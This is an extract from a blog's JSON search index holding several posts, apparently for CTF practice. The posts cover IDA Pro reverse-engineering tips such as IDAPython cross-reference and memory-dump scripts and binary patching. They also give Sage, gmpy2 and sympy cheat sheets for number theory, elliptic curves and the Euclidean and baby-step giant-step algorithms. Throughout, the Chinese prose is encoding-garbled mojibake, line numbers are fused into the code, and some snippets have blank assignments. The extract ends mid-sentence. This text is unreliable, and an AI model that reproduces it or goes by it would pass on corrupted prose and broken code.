‡å¿—ï¼Œæ ¹æ®æ ‡å¿—è¿”å›True/False äº¤å‰å¼•ç”¨12345import idcea = here()for i in CodeRefsTo(ea,False): print(hex(i))# è·å–åœ°å€å¤„å¼•ç”¨ä½ç½®ã€‚Aè°ƒç”¨Bï¼Œå¯¹Bå‡½æ•°åœ°å€ä½¿ç”¨æ­¤å‡½æ•°åˆ™æ‰¾åˆ°Aè°ƒç”¨ï¼Œè¿”å›åˆ—è¡¨ï¼Œéå†åˆ—è¡¨åˆ™å¯ä»¥æ‰¾å‡ºæ‰€æœ‰å¼•ç”¨ä½ç½®ã€‚å‚æ•°1æ˜¯eaä¹Ÿå°±æ˜¯åœ°å€ï¼Œå‚æ•°2å‘Šè¯‰IDAæ˜¯å¦è·Ÿè¸ªè¿™äº›ä»£ç ã€‚ â€‹ ä½æ“ä½œ123456def LOBYTE(x): return x &amp; 0xffdef HIBYTE(x): return (x &gt;&gt; 8) &amp; 0xffdef LOWORD(x): return x &amp; 0xffffdef HIWORD(x): return (x &gt;&gt; 16) &amp; 0xffffdef LODWORD(x): return x &amp; 0xffffffffdef HIDWORD(x): return (x &gt;&gt; 32) &amp; 0xffffffff â€‹ å…¶ä»–æ“ä½œå¯¼å‡ºarrayä¸ºæ•°ç»„å³é”®arrayå˜é‡å â†’ è½¬ä¸ºdword â†’ Export as â†’ C unsigned char array (hex) æ‰‹åŠ¨ä¿®å¤æ ˆæŒ‡é’ˆï¼ˆDecompilation failure: positive sp value has been foundï¼‰ç°è±¡ï¼šæ— æ³•åç¼–è¯‘ ä¿®å¤ï¼š å¯¹æ ‡çº¢ä½ç½®æŒ‰ Alt+K ä¿®æ”¹æ ˆåç§»ï¼š ä¿®æ”¹å F5 å³å¯ã€‚ æ‰‹åŠ¨ä¿®æ”¹æ±‡ç¼–æˆ–äºŒè¿›åˆ¶ä»£ç ï¼ˆPatchï¼‰ æ¿€æ´»åŠŸèƒ½ Editâ–¶Patch Programèœå•GUIç‰ˆæœ¬çš„IDAçš„ä¸€é¡¹éšè—åŠŸèƒ½ï¼Œç”¨æˆ·éœ€è¦ç¼–è¾‘idagui.cfgé…ç½®æ–‡ä»¶æ‰èƒ½æ¿€æ´»è¯¥èœå•ã€‚ æ”¹å­—èŠ‚ï¼ˆChange wordï¼‰ IDAâ€”â€”Editâ€”â€”Patch Programâ€”â€”Change word ç”¨äºç¼–è¾‘IDAæ•°æ®åº“ä¸­çš„å­—èŠ‚å€¼ã€‚è¿™ä¸ªå¯¹è¯æ¡†æ˜¾ç¤ºäº†ä»å…‰æ ‡æ‰€åœ¨ä½ç½®å¼€å§‹çš„16ä¸ªå­—èŠ‚çš„å€¼ã€‚ä½ å¯ä»¥æ›´æ”¹æ˜¾ç¤ºçš„éƒ¨åˆ†æˆ–å…¨éƒ¨å­—èŠ‚ã€‚åŒæ—¶,Addressè¡¨ç¤ºäº†è™šæ‹Ÿåœ°å€ï¼ŒFile offsetè¡¨ç¤ºäº†æ–‡ä»¶åç§»é‡ã€‚ å®é™…ä¸Šï¼ŒHex Viewå¯ä»¥ç›´æ¥æ”¹å­—èŠ‚ï¼Œå³é”®Editå³å¯ã€‚ æ”¹å†…å®¹ï¼ˆAssembleï¼‰ IDAâ€”â€”Editâ€”â€”Patch Programâ€”â€”Assemble åˆ©ç”¨â€œæ±‡ç¼–â€é€‰é¡¹å¯ä»¥è¾“å…¥ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨æ±‡ç¼–å™¨æ±‡ç¼–çš„æ±‡ç¼–è¯­è¨€è¯­å¥ã€‚ç„¶åï¼ŒIDAä¼šå°†å¾—åˆ°çš„æŒ‡ä»¤å­—èŠ‚å†™å…¥å½“å‰çš„å±å¹•ä½ç½®ã€‚ åº”ç”¨ä¿®æ”¹ï¼ˆApply patches to input fileï¼‰ IDAâ€”â€”Editâ€”â€”Patch Programâ€”â€”Apply patches to input file æŠŠæ”¹åŠ¨æ›´æ–°åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚ æ‰‹åŠ¨å®šä¹‰ä¸ºå‡½æ•°ï¼ˆæ¢å¤ä¼ªä»£ç ï¼‰æ¥åˆ°ä¸€å¤„çœ‹ä¼¼å¾ˆåƒå…³é”®ä»£ç å¤„çš„ä½ç½®ï¼š åœ¨è¿™éƒ¨åˆ†ä»£ç çš„å¤´éƒ¨æŒ‰ P é”®å®šä¹‰ä¸ºå‡½æ•°ï¼Œæ¥ç€å°è¯•æŸ¥çœ‹ä¼ªä»£ç ï¼Œå¾—åˆ°çš„ä¼ªä»£ç æ²¡æœ‰å˜é‡è¯†åˆ«ï¼Œéå¸¸éš¾çœ‹ã€‚ äºæ˜¯æˆ‘ä»¬å°è¯•ä¿®å¤å †æ ˆä¿¡æ¯ï¼Œè®© IDA èƒ½å¤Ÿè¯†åˆ«å‡ºæ¥å˜é‡ã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç€åœ¨è¿™éƒ¨åˆ†ä¹‹ä¸Šä½¿ç”¨ Keypatch æ‰‹åŠ¨åŠ å…¥ä¸€ä¸ª push rbp; mov rbp, rsp è®© IDA èƒ½å¤Ÿè¯†åˆ«å‡ºå †æ ˆä¸Šçš„å˜é‡ï¼Œç´§æ¥ç€å† F5ï¼Œå°±å¯ä»¥çœ‹åˆ°æ¯”è¾ƒèˆ’æœçš„ä¼ªä»£ç äº†ã€‚ Dumpä»£ç ç”Ÿæˆæ–°è„šæœ¬ä½¿ç”¨IDA Proè°ƒè¯•ç¨‹åºæ—¶å¶å°”ä¼šé‡åˆ°dumpå†…å­˜çš„éœ€æ±‚ï¼ŒIDA Proå¹¶æ²¡æœ‰ç›´æ¥æä¾›å†…å­˜dumpçš„åŠŸèƒ½ï¼Œä½†å¯ä»¥é€šè¿‡å…¶æä¾›çš„æ¥å£ç”¨è„šæœ¬æ¥å®ç°ç›¸å…³åŠŸèƒ½ã€‚ IDCè„šæœ¬1234auto i,fp;fp = fopen(&quot;d:\\\\dump.dex&quot;,&quot;wb&quot;);for (i = start_address; i &lt;= end_address; i++) fputc(Byte(i),fp); Pythonè„šæœ¬12345import idaapidata = idaapi.dbg_read_memory(start_address, data_length)fp = open(&#x27;d:\\\\dump&#x27;, &#x27;wb&#x27;)fp.write(data)fp.close() å¼‚å¸¸å¤„ç†é€‰æ‹©æœ¬åœ°Windowsè°ƒè¯•å™¨åç‚¹å‡»debuggeré€‰é¡¹å¡ä¸­çš„debugger optionsï¼Œé€‰æ‹©å·¦ä¸‹è§’çš„edit exceptionsï¼Œå¦‚è§¦å‘äº†é™¤é›¶å¼‚å¸¸ï¼Œå¯ä»¥æ‰¾åˆ°æ•´æ•°é™¤é›¶å¼‚å¸¸ï¼ˆEXCEPTION_INT_DIVIDE_BY_ZERO)ï¼Œé€‰æ‹©pass to applicationå’Œsilentï¼Œä¸‹æ–­è°ƒè¯•å³å¯ã€‚","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"}],"author":"Lazzaro"},{"title":"cryptoå¸¸ç”¨å·¥å…·","slug":"crypto-cryptoå¸¸ç”¨å·¥å…·","date":"2020-05-10T14:41:00.000Z","updated":"2023-10-13T12:59:53.805Z","comments":true,"path":"2020/05/10/crypto-cryptoå¸¸ç”¨å·¥å…·/","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","excerpt":"","text":"å¸¸ç”¨å·¥å…·å¤å…¸å¯†ç  ç»´å‰å°¼äºšå¯†ç ï¼ˆVigenereï¼‰ï¼š https://github.com/atomcated/Vigenereï¼ˆåŠ å¯†è§£å¯†ç¨‹åºï¼ŒåŒ…å«è‡ªåŠ¨çŒœæµ‹å¯†é’¥åŠŸèƒ½ï¼‰ https://www.guballa.de/vigenere-solver whitespaceè¯­è¨€ï¼š https://ideone.com/ â€‹ gmpy212345678910from gmpy2 import *mpz(n) #åˆå§‹åŒ–ä¸€ä¸ªå¤§æ•´æ•°mpfr(x) # åˆå§‹åŒ–ä¸€ä¸ªé«˜ç²¾åº¦æµ®ç‚¹æ•°xd = invert(e,n) # æ±‚é€†å…ƒï¼Œde = 1 mod nc = powmod(m,e,n) # å¹‚å–æ¨¡ï¼Œç»“æœæ˜¯ c = m^e mod nis_prime(n) #ç´ æ€§æ£€æµ‹gcd(a,b) #æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œæœ€å¤§å…¬çº¦æ•°gcdext(a,b) #æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•iroot(x,n) #xå¼€næ¬¡æ ¹ â€‹ sympy12345678from sympy import *prime(n) #ç¬¬nä¸ªç´ æ•°isprime(n) #ç´ æ€§æ£€æµ‹primepi(n) #å°äºnçš„ç´ æ•°çš„æ€»æ•°nextprime(n) #ä¸‹ä¸€ä¸ªç´ æ•°prevprime(n) #ä¸Šä¸€ä¸ªç´ æ•°nthroot_mod(c,e,p,all_roots=True) #æœ‰é™åŸŸå¼€æ–¹ â€‹ Sageå®šä¹‰ 123456R.&lt;X&gt; = PolynomialRing(Zmod(n))#Zmod(n):æŒ‡å®šæ¨¡ï¼Œå®šä¹‰ç•Œé™ä¸ºnçš„ç¯ï¼›Zè¡¨ç¤ºæ•´æ•°ï¼›æŒ‡å®šæ¨¡æ˜¯åˆ’å®šè¿™ä¸ªç¯çš„ç•Œé™ï¼Œå°±æ˜¯æœ‰æ•ˆçš„æ•°å­—åªæœ‰ä»0åˆ°nï¼Œå…¶ä»–çš„éƒ½é€šè¿‡ä¸nå–æ¨¡æ¥ä¿è¯åœ¨0ï½nè¿™ä¸ªèŒƒå›´å†…ï¼›Zmodä»£è¡¨è¿™æ˜¯ä¸€ä¸ªæ•´æ•°åŸŸä¸­çš„næ¨¡ç¯#ZZï¼šæ•´æ•°ç¯ï¼›QQï¼šæœ‰ç†æ•°ç¯ï¼›RRï¼šå®æ•°ç¯ï¼›CCï¼šå¤æ•°ç¯#Rï¼šåªæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç”¨polynomialringæŒ‡å®šçš„é‚£ä¸ªç¯ï¼ˆå¯ä»¥ä½¿ç”¨ä»»æ„å­—ç¬¦ï¼‰#PolynomialRingï¼šè¿™ä¸ªå°±æ˜¯è¯´å»ºç«‹å¤šé¡¹å¼ç¯#.&lt;X&gt;ï¼šæŒ‡å®šä¸€ä¸ªå˜é‡çš„æ„æ€ï¼ˆå¯ä»¥ç”¨ä»»æ„å­—ç¬¦ï¼‰ â€‹ æ•°è®º 123456789101112131415161718192021prime_pi(n) #å°äºç­‰äºnçš„ç´ æ•°ä¸ªæ•°divisors(n) #nçš„å› å­number_of_divisors(n) #nçš„å› å­æ•°factor(n) #nçš„å› å¼åˆ†è§£euler_phi(n) #nçš„æ¬§æ‹‰å‡½æ•°å€¼two_squares(n) #nçš„ä¸¤æ•°å¹³æ–¹ç»„åˆthree_squares(n) #nçš„ä¸‰æ•°å¹³æ–¹ç»„åˆfour_squares(n) #nçš„å››æ•°å¹³æ–¹ç»„åˆx.nth_root(n, truncate_mode=True) #xå¼€næ¬¡æ–¹ï¼ˆä¸ç®¡æ˜¯å¦å®Œå…¨å¼€æ–¹ï¼Œå–æ•´ï¼‰mod(x,p).nth_root(n) #xæœ‰é™åŸŸå¼€næ¬¡æ–¹# xæœ‰é™åŸŸå¼€næ¬¡æ–¹ï¼Œeå¤§def mod_nth_root(x, e, n): r, z = pari(f&quot;r = sqrtn(Mod(&#123;x&#125;, &#123;n&#125;), &#123;e&#125;, &amp;z); [lift(r), lift(z)]&quot;) r, z = int(r), int(z) roots = [r] t = r while (t := (t*z) % n) != r: roots.append(t) return roots â€‹ å¤šé¡¹å¼ 12345678910111213141516171819202122232425262728293031323334353637f.subs(&#123;x:x1&#125;) #æŠŠx1å€¼ä»£å…¥xf.univariate_polynomial() #æ˜ å°„ä¸ºå•å˜é‡å¤šé¡¹å¼f.univariate_polynomial().roots() #å•å˜é‡å¤šé¡¹å¼æ±‚æ ¹f.coefficients() #å¤šé¡¹å¼ç³»æ•°åˆ—è¡¨f.padded_list(n) #å¤šé¡¹å¼ç³»æ•°è½¬æ¢ä¸ºé•¿åº¦ä¸ºnçš„åˆ—è¡¨f.list() #å¤šé¡¹å¼ç³»æ•°f.monic() #é¦–ä¸€å¤šé¡¹å¼f.sub(x,x-1) #å°†x-1ä»£å…¥xf.factor() #åˆ†è§£å› å¼#å› å¼åˆ†è§£ï¼ˆå•å…ƒï¼‰x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = (x^3 - 1)^2-(x^2-1)^2f.factor()#å› å¼åˆ†è§£ï¼ˆäºŒå…ƒï¼‰x, y = PolynomialRing(RationalField(), 2, [&#x27;x&#x27;,&#x27;y&#x27;]).gens()f = (9*y^6 - 9*x^2*y^5 - 18*x^3*y^4 - 9*x^5*y^4 + 9*x^6*y^2 + 9*x^7*y^3 + 18*x^8*y^2 - 9*x^11)f.factor()#GCDï¼ˆå•å…ƒï¼‰x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = 3*x^3 + xg = 9*x*(x+1)f.gcd(g)#GCDï¼ˆå¤šå…ƒï¼‰R.&lt;x,y,z&gt; = PolynomialRing(RationalField(), order=&#x27;lex&#x27;)f = 3*x^2*(x+y)g = 9*x*(y^2 - x^2)f.gcd(g)#å¤šé¡¹å¼/æ•´æ•°è½¬æ¢PR = PolynomialRing(GF(2),&#x27;x&#x27;)R.&lt;x&gt; = GF(2^2049)pc = R.fetch_int(xx) #æ•´æ•°è½¬å¤šé¡¹å¼xx = R(PR(pc)).integer_representation() #å¤šé¡¹å¼è½¬æ•´æ•° â€‹ çŸ©é˜µ 123456789101112131415161718192021A = matrix(ZZ, [[1,1],[0,4]])A.nrows() #è¡Œæ•°A.ncols() #åˆ—æ•°A.transpose() #è½¬ç½®A.inverse() æˆ– A^(-1) #é€†A.rank() #ç§©A.det() #è¡Œåˆ—å¼A.stack(vector([1,2])) #çŸ©é˜µåæ·»åŠ ä¸€è¡ŒA.augment(vector([1,2])) #çŸ©é˜µåæ·»åŠ ä¸€åˆ—A.insert_row(1, vector([1,2])) #åœ¨ç¬¬ä¸€è¡Œæ’å…¥A.change_ring(QQ) #æ›´æ¢ç¯ä¸ºQQA.solve_left(B) æˆ– A/B #æ±‚è§£XA=BA.solve_right(B) æˆ– A\\B #æ±‚è§£AX=BA.left_kernel() #æ±‚è§£XA=0ï¼Œçº¿æ€§ç›¸å…³çš„è¡Œå‘é‡A.right_kernel() #æ±‚è§£AX=0ï¼Œçº¿æ€§ç›¸å…³çš„è¡Œå‘é‡A.LLL() #æœ€çŸ­æ­£äº¤åŸºA.multiplicative_order() #ä¹˜æ³•é˜¶matrix.zero(2,3) / zero_matrix(2,3) #2*3é›¶çŸ©é˜µmatrix.identity(2) / identity_matrix(2) #2*2å•ä½é˜µblock_matrix(QQ,[[A,zero_matrix(n,1)],[matrix(b),matrix([1e-16])]]) #çŸ©é˜µæ‹¼æ¥ â€‹ è§£æ–¹ç¨‹ $\\begin{cases} x+y=10 \\\\ xy=21 \\end{cases} $ 12var(&#x27;x y&#x27;)solve([x+y==10,x*y==21],[x,y]) â€‹ è§£çº¿æ€§æ–¹ç¨‹ç»„ $AX=B$ 123456A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) Y = vector([0,-4,-1]) X = A.solve_right(Y)#æˆ–A \\ Y#åæ–œæ  \\ å¯ä»¥ä»£æ›¿ solve_right; ç”¨ A \\ Y ä»£æ›¿ A.solve right(Y). â€‹ æ±‚é€†å…ƒ $ed=1\\pmod {\\varphi(n)}$ 1d = inverse_mod(e,fn) # sageæ±‚é€†å…ƒ â€‹ æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³• 12d,u,v=xgcd(20,30)print(&quot;d:&#123;0&#125; u:&#123;1&#125; v:&#123;2&#125;&quot;.format(d,u,v)) #d:10 u:-1 v:1 â€‹ CRTï¼ˆä¸­å›½å‰©ä½™å®šç†ï¼‰ $\\begin{cases} x\\equiv2\\pmod3 \\\\ x\\equiv3\\pmod5 \\\\ x\\equiv2\\pmod7 \\end{cases} $ 1crt([2,3,2],[3,5,7]) 123456789#ä»…é€‚ç”¨æ¨¡ä¸¤ä¸¤äº’ç´ def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 â€‹ ç¦»æ•£å¯¹æ•° $a^x \\equiv b \\pmod {n}$ 1234567891011#nä¸ºåˆæ•°ï¼ˆPohlig-Hellmanï¼‰x = discrete_log(mod(b,n),mod(a,n)) #nä¸ºè´¨æ•°æˆ–è´¨æ•°å¹‚ï¼ˆçº¿æ€§ç­›Index Calculusï¼‰R = Integers(99)a = R(4)b = a^9b.log(a)x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) â€‹ æ¬§æ‹‰å‡½æ•° $\\varphi(x)=x\\prod\\limits_{i=1}^n(1-\\frac{1}{p_i})$ 1print(euler_phi(71)) #70 â€‹ æ•´æ•°åŸŸæ¤­åœ†æ›²çº¿ $y^2=x^3+a_4x+a_6$ è¾“å‡ºæ‰€æœ‰æ•´æ•°ç‚¹ 1234567891011121314151617181920#ç´ æ•°åŸŸF = GF(7)#ç´ æ•°åŸŸçš„é˜¶print(F.order())#æ¤­åœ†æ›²çº¿E7(2,3)E = EllipticCurve(F,[0,0,0,2,3])#åŸºç‚¹åæ ‡G = E.gens()[0]#é˜¶ï¼ˆä¸åŒçš„ç¦»æ•£çš„ç‚¹ä¸ªæ•°ï¼‰q = E.order()#æ‰€æœ‰çš„ç‚¹allPoints = E.points()#åˆ›å»ºç‚¹P = E(2,1)#ç‚¹çš„xyåæ ‡å€¼P.xy()#å€æ•°ç‚¹Q = k*PQ.division_points(k) # ç»“æœä¸ºP â€‹ æ›²çº¿ 12345678910111213# æŸ¥äºæ ¼ï¼ˆGenusï¼‰x, y = ZZ[&#x27;x, y&#x27;].gens()eq = x ^ 3 + y ^ 3 + 1 - d * x * yCurve(eq).genus() # Genus=1ä¸ºæ¤­åœ†æ›²çº¿# æ˜ å°„# solve x^3+y^3+z^3=d*x*y*zR.&lt;xx,yy,zz&gt; = Zmod(p)[]cubic = xx^3 + yy^3 + zz^3 - d * xx * yy * zzEC = EllipticCurve_from_cubic(cubic, morphism=False) #æ˜ å°„çš„æ¤­åœ†æ›²çº¿mf = EllipticCurve_from_cubic(cubic, morphism=True) #æ˜ å°„å…³ç³»P = PP = mf(P) â€‹ è§£æ¨¡æ–¹ç¨‹ $ax^2+bx+c \\equiv d \\pmod p$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x^2 + b * x + c - dx = f.monic().roots()print(x) â€‹ è§£æ–¹ç¨‹ç»„ $\\begin{cases} N=pq \\\\ \\varphi = (p-1)(q-1) \\end{cases} $ 12345678910111213141516P.&lt;p, q&gt; = PolynomialRing(ZZ)def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))N = phi = f1 = (N + 1) - phi - p - qf2 = N - p*qp, q = solve(f1, f2)(p, q) å‚è€ƒï¼š https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ â€‹ ç»“å¼ 12345678910111213from sage.matrix.matrix2 import Matrixdef resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))n = P.&lt;k,t2,t3,d&gt; = PolynomialRing(Integers(n))f1 = s1*k - h - r*df2 = s2*(k+t2) - h - r*df3 = s3*(k+t3) - h - r*dh1 = resultant(f1, f2, d)h2 = resultant(f1, f3, d)g1 = resultant(h1, h2, k)roots = g1.univariate_polynomial().roots() â€‹ WolframAlphahttps://www.wolframalpha.com/","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"}],"author":"Lazzaro"},{"title":"cryptoå¸¸ç”¨ç®—æ³•","slug":"crypto-cryptoå¸¸ç”¨ç®—æ³•","date":"2020-05-10T09:54:00.000Z","updated":"2023-11-12T13:19:03.586Z","comments":true,"path":"2020/05/10/crypto-cryptoå¸¸ç”¨ç®—æ³•/","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/","excerpt":"","text":"æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆè¾—è½¬ç›¸é™¤æ³•ï¼‰åœ¨æ•°å­¦ä¸­ï¼Œè¾—è½¬ç›¸é™¤æ³•ï¼Œåˆç§°æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆè‹±è¯­ï¼šEuclidean algorithmï¼‰ï¼Œæ˜¯æ±‚æœ€å¤§å…¬çº¦æ•°çš„ç®—æ³•ã€‚ ä¸¤ä¸ªæ•´æ•°çš„æœ€å¤§å…¬çº¦æ•°æ˜¯èƒ½å¤ŸåŒæ—¶æ•´é™¤å®ƒä»¬çš„æœ€å¤§çš„æ­£æ•´æ•°ã€‚è¾—è½¬ç›¸é™¤æ³•åŸºäºå¦‚ä¸‹åŸç†ï¼šä¸¤ä¸ªæ•´æ•°çš„æœ€å¤§å…¬çº¦æ•°ç­‰äºå…¶ä¸­è¾ƒå°çš„æ•°å’Œä¸¤æ•°ç›¸é™¤ä½™æ•°çš„æœ€å¤§å…¬çº¦æ•°ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè¾ƒå¤§çš„æ•°ç¼©å°äº†ï¼Œæ‰€ä»¥ç»§ç»­è¿›è¡ŒåŒæ ·çš„è®¡ç®—å¯ä»¥ä¸æ–­ç¼©å°è¿™ä¸¤ä¸ªæ•°ç›´è‡³å…¶ä¸­ä¸€ä¸ªå˜æˆé›¶ã€‚è¿™æ—¶ï¼Œæ‰€å‰©ä¸‹çš„è¿˜æ²¡æœ‰å˜æˆé›¶çš„æ•°å°±æ˜¯ä¸¤æ•°çš„æœ€å¤§å…¬çº¦æ•°ã€‚ç”±è¾—è½¬ç›¸é™¤æ³•ä¹Ÿå¯ä»¥æ¨å‡ºï¼Œä¸¤æ•°çš„æœ€å¤§å…¬çº¦æ•°å¯ä»¥ç”¨ä¸¤æ•°çš„æ•´æ•°å€ç›¸åŠ æ¥è¡¨ç¤ºï¼Œå¦‚ $21 = 5 Ã— 105 + (âˆ’2) Ã— 252$ã€‚è¿™ä¸ªé‡è¦çš„ç»“è®ºå«åšè£´èœ€å®šç†ã€‚ åœ¨ç°ä»£å¯†ç å­¦æ–¹é¢ï¼Œå®ƒæ˜¯RSAç®—æ³•çš„é‡è¦éƒ¨åˆ†ã€‚å®ƒè¿˜è¢«ç”¨æ¥è§£ä¸¢ç•ªå›¾æ–¹ç¨‹ï¼Œæ¯”å¦‚å¯»æ‰¾æ»¡è¶³ä¸­å›½å‰©ä½™å®šç†çš„æ•°ï¼Œæˆ–è€…æ±‚æœ‰é™åŸŸä¸­å…ƒç´ çš„é€†ã€‚è¾—è½¬ç›¸é™¤æ³•è¿˜å¯ä»¥ç”¨æ¥æ„é€ è¿åˆ†æ•°ï¼Œåœ¨æ–½å›¾å§†å®šç†å’Œä¸€äº›æ•´æ•°åˆ†è§£ç®—æ³•ä¸­ä¹Ÿæœ‰åº”ç”¨ã€‚è¾—è½¬ç›¸é™¤æ³•æ˜¯ç°ä»£æ•°è®ºä¸­çš„åŸºæœ¬å·¥å…·ã€‚ 12345def gcd(a, b): if b == 0: return a else: return gcd(b, a % b) â€‹ æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆè‹±è¯­ï¼šExtended Euclidean algorithmï¼‰æ˜¯æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆåˆå«è¾—è½¬ç›¸é™¤æ³•ï¼‰çš„æ‰©å±•ã€‚å·²çŸ¥æ•´æ•° $a,b$ï¼Œæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ä»¥åœ¨æ±‚å¾—$a,b$çš„æœ€å¤§å…¬çº¦æ•°çš„åŒæ—¶ï¼Œèƒ½æ‰¾åˆ°æ•´æ•° $x,y$ï¼ˆå…¶ä¸­ä¸€ä¸ªå¾ˆå¯èƒ½æ˜¯è´Ÿæ•°ï¼‰ï¼Œä½¿å®ƒä»¬æ»¡è¶³è£´èœ€å®šç† $ax + by = \\gcd(a, b)$å¦‚æœ $a$ æ˜¯è´Ÿæ•°ï¼Œå¯ä»¥æŠŠé—®é¢˜è½¬åŒ–æˆ $|a|(-x)+by=\\gcd(|a|,b))$ï¼ˆ$|a|$ ä¸º $a$ çš„ç»å¯¹å€¼ï¼‰ï¼Œç„¶åä»¤ $xâ€™=(-x)$ã€‚é€šå¸¸è°ˆåˆ°æœ€å¤§å…¬çº¦æ•°æ—¶ï¼Œæˆ‘ä»¬éƒ½ä¼šæåˆ°ä¸€ä¸ªéå¸¸åŸºæœ¬çš„äº‹å®ï¼ˆç”±è£´èœ€å®šç†ç»™å‡ºï¼‰ï¼šç»™å®šäºŒä¸ªæ•´æ•° $a,b$ï¼Œå¿…å­˜åœ¨æ•´æ•° $x,y$ ä½¿å¾— $ax + by = \\gcd(a, b)$ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå·²çŸ¥ä¸¤ä¸ªæ•° $a$ å’Œ $b$ï¼Œå¯¹å®ƒä»¬è¿›è¡Œè¾—è½¬ç›¸é™¤ï¼ˆæ¬§å‡ é‡Œå¾—ç®—æ³•ï¼‰ï¼Œå¯å¾—å®ƒä»¬çš„æœ€å¤§å…¬çº¦æ•°ã€‚ä¸è¿‡ï¼Œåœ¨æ¬§å‡ é‡Œå¾—ç®—æ³•ä¸­ï¼Œæˆ‘ä»¬ä»…ä»…åˆ©ç”¨äº†æ¯æ­¥å¸¦ä½™é™¤æ³•æ‰€å¾—çš„ä½™æ•°ã€‚æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è¿˜åˆ©ç”¨äº†å¸¦ä½™é™¤æ³•æ‰€å¾—çš„å•†ï¼Œåœ¨è¾—è½¬ç›¸é™¤çš„åŒæ—¶ä¹Ÿèƒ½å¾—åˆ°è£´èœ€ç­‰å¼ä¸­çš„ $x,y$ ä¸¤ä¸ªç³»æ•°ã€‚ä»¥æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å¾—çš„ç³»æ•°æ˜¯æ»¡è¶³è£´èœ€ç­‰å¼çš„æœ€ç®€ç³»æ•°ã€‚ å¦å¤–ï¼Œæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ˜¯ä¸€ç§è‡ªéªŒè¯ç®—æ³•ï¼Œæœ€åä¸€æ­¥å¾—åˆ°çš„ $s_{i+1}$ å’Œ $t_{i+1}$ ä¹˜ä»¥ $\\gcd(a,b)$ åæ°ä¸º $a$ å’Œ $b$ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯è®¡ç®—ç»“æœæ˜¯å¦æ­£ç¡®ã€‚ æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ä»¥ç”¨æ¥è®¡ç®—æ¨¡åå…ƒç´ ï¼ˆä¹Ÿå«æ¨¡é€†å…ƒï¼‰ï¼Œæ±‚å‡ºæ¨¡åå…ƒç´ æ˜¯RSAåŠ å¯†ç®—æ³•ä¸­è·å¾—æ‰€éœ€å…¬é’¥ã€ç§é’¥çš„å¿…è¦æ­¥éª¤ã€‚ 1234567def ext_euclid(a, b): if b == 0: return 1, 0, a else: x, y, q = ext_euclid(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q â€‹ å¤§æ­¥å°æ­¥ç®—æ³•ï¼ˆBSGSç®—æ³•ï¼‰åœ¨ç¾¤è®ºä¸­ï¼Œå¤§æ­¥å°æ­¥ç®—æ³•ï¼ˆè‹±è¯­ï¼šbaby-step giant-stepï¼‰æ˜¯ä¸¹å°¼å°”Â·å°šå…‹æ–¯å‘æ˜çš„ä¸€ç§ä¸­é€”ç›¸é‡ç®—æ³•ï¼Œç”¨äºè®¡ç®—ç¦»æ•£å¯¹æ•°æˆ–è€…æœ‰é™é˜¿è´å°”ç¾¤çš„é˜¶ã€‚å…¶ä¸­ç¦»æ•£å¯¹æ•°é—®é¢˜åœ¨å…¬é’¥åŠ å¯†é¢†åŸŸæœ‰ç€éå¸¸é‡è¦çš„åœ°ä½ã€‚ è®¸å¤šå¸¸ç”¨çš„åŠ å¯†ç³»ç»Ÿéƒ½åŸºäºç¦»æ•£å¯¹æ•°æéš¾è®¡ç®—è¿™ä¸€å‡è®¾â€”â€”è®¡ç®—è¶Šå›°éš¾ï¼Œè¿™äº›ç³»ç»Ÿæä¾›çš„æ•°æ®ä¼ è¾“å°±è¶Šå®‰å…¨ã€‚å¢åŠ ç¦»æ•£å¯¹æ•°è®¡ç®—éš¾åº¦çš„ä¸€ç§æ–¹æ³•ï¼Œæ˜¯æŠŠå¯†ç 